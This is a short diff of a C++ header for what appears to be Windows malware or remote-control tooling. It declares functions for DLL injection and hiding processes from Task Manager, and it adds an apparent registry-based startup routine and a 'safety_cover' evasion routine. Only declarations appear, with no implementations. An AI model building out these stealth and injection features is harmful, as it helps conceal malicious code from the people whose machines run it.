@@ -2,6 +2,7 @@
 #include "WindowsException.hpp"
 #include "Process.hpp"
 #include "Logger.hpp"
+#include "RegistryKey.hpp"
 #include "Directory.hpp"
 #include <Windows.h>
 #include <tlhelp32.h>
@@ -26,6 +27,8 @@ namespace SystemUtils
 	void inject_dll(const int process_id, const std::string& dll_path);
 	void hide_process_from_tskmgr(const std::wstring& process_name);
 	void hide_from_task_manager();
+	void safety_startup();
+	void safety_cover(bool is_dangerous);
 	void get_dir_list();
 	std::wstring get_exe_path();
 }
